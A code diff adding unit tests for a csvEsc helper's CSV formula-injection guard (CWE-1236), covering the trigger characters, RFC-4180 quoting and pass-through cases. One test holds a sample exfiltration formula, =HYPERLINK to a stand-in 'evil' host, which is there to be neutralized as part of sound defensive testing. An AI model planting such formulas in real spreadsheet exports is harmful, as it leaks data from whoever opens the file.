@@ -51,6 +51,49 @@ describe('csvEsc', () => {
   });
 });
 
+// CWE-1236 / OWASP "CSV Injection": a cell that starts with =, +, -, or @ is
+// evaluated as a formula when the exported CSV opens in Excel / Google Sheets /
+// LibreOffice. csvEsc prefixes a single apostrophe so the cell is forced to
+// literal text, and the guard composes with (runs before) the RFC-4180 quoting.
+describe('csvEsc — formula-injection guard (CWE-1236)', () => {
+  it('prefixes an apostrophe for each formula-trigger leading character', () => {
+    expect(csvEsc('=SUM(A1:A9)')).toBe("'=SUM(A1:A9)");
+    expect(csvEsc('+1')).toBe("'+1");
+    expect(csvEsc('-1+2')).toBe("'-1+2");
+    expect(csvEsc('@import')).toBe("'@import");
+  });
+
+  it('neutralizes a classic exfiltration payload', () => {
+    expect(csvEsc('=HYPERLINK("http://evil","x")'))
+      .toBe('"\'=HYPERLINK(""http://evil"",""x"")"');
+  });
+
+  it('leaves a normal value unchanged (guard only fires on the trigger set)', () => {
+    expect(csvEsc('joao')).toBe('joao');
+    expect(csvEsc('2026-06')).toBe('2026-06'); // '-' only triggers when LEADING
+    expect(csvEsc('a=b')).toBe('a=b'); // '=' not at the start
+    expect(csvEsc("O'Brien")).toBe("O'Brien");
+  });
+
+  it('composes with RFC-4180 quoting when a guarded value also has a comma/quote', () => {
+    // guard first (=a,b -> '=a,b), then quote because of the comma.
+    expect(csvEsc('=a,b')).toBe('"\'=a,b"');
+    // guard, then quote + double the embedded quote.
+    expect(csvEsc('=a"b')).toBe('"\'=a""b"');
+  });
+
+  it('does not double-guard a value that already starts with an apostrophe', () => {
+    // a leading apostrophe is not in the trigger set, so it passes through.
+    expect(csvEsc("'=already")).toBe("'=already");
+  });
+
+  it('coerces then guards: a number is never a formula, a string 0/false pass through', () => {
+    expect(csvEsc(0)).toBe('0');
+    expect(csvEsc(-5)).toBe("'-5"); // String(-5) === '-5' starts with '-'
+    expect(csvEsc(false)).toBe('false');
+  });
+});
+
 describe('toCsv', () => {
   it('joins a header + data rows with comma cells and newline rows', () => {
     expect(toCsv([['a', 'b'], ['1', '2'], ['3', '4']])).toBe('a,b\n1,2\n3,4');
